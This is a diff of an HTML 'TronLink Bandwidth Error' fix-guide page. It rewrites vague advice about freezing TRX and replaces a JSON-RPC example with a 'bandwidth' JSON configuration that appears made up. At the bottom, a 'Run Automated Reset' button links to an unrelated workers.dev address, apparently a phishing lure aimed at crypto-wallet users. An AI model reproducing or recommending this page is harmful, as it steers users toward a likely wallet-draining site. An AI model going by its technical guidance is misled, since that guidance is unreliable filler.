@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Tronlink Bandwidth Error – Fix Guide</title>
+<head><meta charset="UTF-8"><title>TronLink Bandwidth Error – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #0f111a;
+        font-family: BlinkMacSystemFont;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
-        background: #ff9455;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -39,39 +39,39 @@
 </head>
 <body>
 <div class="content">
-<h1>Tronlink Bandwidth Error</h1>
+<h1>TronLink Bandwidth Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message "Tronlink Bandwidth Error" when attempting to perform transactions or interact with smart contracts on the TRON network using TronLink.</li>
+<li>Users encounter an error message stating "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network using TronLink.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to process transactions and execute smart contracts on the network.</li>
+<li>The error occurs due to insufficient bandwidth or incorrect bandwidth settings in the user's TronLink account, which is required for transaction processing on the TRON network.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account's bandwidth by freezing TRX tokens for a specified period.</li>
-<li>Check and adjust the transaction parameters to optimize bandwidth usage.</li>
-<li>Use the following JSON-RPC command to estimate the required bandwidth:</li>
+<li>Increase the account bandwidth by freezing TRX tokens for bandwidth:</li>
+<li>Use the TronLink interface to freeze TRX for bandwidth</li>
+<li>Utilize the TRON command-line tools to adjust bandwidth settings</li>
+<li>Adjust the <code>bandwidth</code> parameter in the following JSON configuration:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;tron_getAccountResource&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="s2">&quot;your_account_address&quot;</span>
-<span class="w">  </span><span class="p">],</span>
-<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">  </span><span class="nt">&quot;account&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;bandwidth&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;frozen&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex JSON-RPC commands.</p>
+<p>Consider using an external console for more complex adjustments.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A TRON account with sufficient TRX balance.</li>
-<li>The latest version of TronLink installed.</li>
-<li>A basic understanding of TRON's resource management system.</li>
+<li>TRX tokens available for freezing</li>
+<li>TronLink account set up and configured</li>
+<li>Basic understanding of TRON network and TronLink functionality</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-all-scripts-load.html">Metamask Extension Using Waituntil To Ensure All Scripts Load</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-unable-to-cancel-pending-transaction-due.html">Metamask Extension Bug Unable To Cancel Pending Transaction Due</a></li><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">Java Tron Feature Tron Post Quantum Signature Migration</a></li><li><a href="./archive/2026/06/go-ethereum-latest-geth-upgrade-resulted-in-a-chain-gap-i-think.html">Go Ethereum Latest Geth Upgrade Resulted In A Chain Gap I Think</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
